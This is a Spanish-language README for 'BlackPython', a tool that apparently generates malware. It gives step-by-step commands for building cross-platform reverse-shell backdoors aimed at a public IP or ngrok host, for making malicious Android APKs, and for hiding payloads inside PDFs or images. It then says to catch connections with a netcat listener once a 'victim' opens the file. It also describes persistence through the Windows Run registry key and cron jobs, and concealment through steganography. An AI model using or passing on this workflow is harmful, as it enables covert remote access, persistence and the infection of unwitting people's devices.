# BlackPython 🐍

Herramienta avanzada para pruebas de penetración y seguridad ofensiva.

## Características
- Generador de backdoors multiplataforma
- Creación de APKs maliciosos para Android
- Camuflaje de payloads en archivos legítimos

## Instalación
```bash
git clone https://github.com/franquitoloco8/BlackPython.git
cd BlackPython
python setup.py

## USO

🛠 Configuración Inicial
1. Clona el repositorio (si estás en otra máquina):
bash

git clone https://github.com/franquitoloco8/BlackPython.git
cd BlackPython

2. Crea un entorno virtual (para aislar dependencias):
bash

python3.10 -m venv .venv  # Crea el entorno
source .venv/bin/activate  # Linux/macOS
# O en Windows:
.venv\Scripts\activate

3. Instala dependencias:
bash
# NECESITAS PYTHON 3.10.13
# Instalar pyenv y Python 3.10.13
git clone https://github.com/pyenv/pyenv.git ~/.pyenv
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 3.10.13

pip install -r requirements.txt

🚀 Puesta en Marcha
▶ 1. Generar un Backdoor (Windows/Linux/macOS)
bash

python main.py backdoor --host "TU_IP_PÚBLICA" --port 4444

    Reemplaza TU_IP_PÚBLICA con tu IP o un dominio de Ngrok (ej: 0.tcp.eu.ngrok.io).

    Para probar localmente, usa 127.0.0.1.

▶ 2. Generar un APK malicioso (Android)
bash

python main.py android --lhost "TU_IP" --lport 4444

    El APK se generará en android/payload.apk.

    Requisito: Necesitarás tener instalado:

        Kotlin Compiler (kotlinc)

        Android SDK (para compilar a APK).

▶ 3. Camuflar un Payload en un Archivo (PDF/Imagen)
bash

python main.py bind --file documento.pdf --payload backdoor.py --output documento_infectado.pdf

    El archivo documento_infectado.pdf contendrá el backdoor oculto.

🔍 Pruebas de Funcionamiento
✔ 1. Para el Backdoor:

    En tu máquina (atacante), escucha conexiones:
    bash

    nc -lvnp 4444

    En la máquina víctima, ejecuta el backdoor o abre el archivo infectado.

✔ 2. Para el APK:

    Instala payload.apk en un Android (emulador o dispositivo físico).

    Al ejecutarse, se conectará a tu servidor (necesitas tener nc escuchando).

📌 Notas Clave

    Persistencia:

        El backdoor se auto-instala en:

            Windows: Registro (HKCU\...\Run).

            Linux: Cron job (/etc/cron.hourly/).

    Ocultamiento:

        Los payloads en PDF/imágenes usan esteganografía (metadatos o LSB).

    Para Android:

        Si no tienes Kotlin instalado, usa Termux en Android:
        bash

pkg install kotlin -y
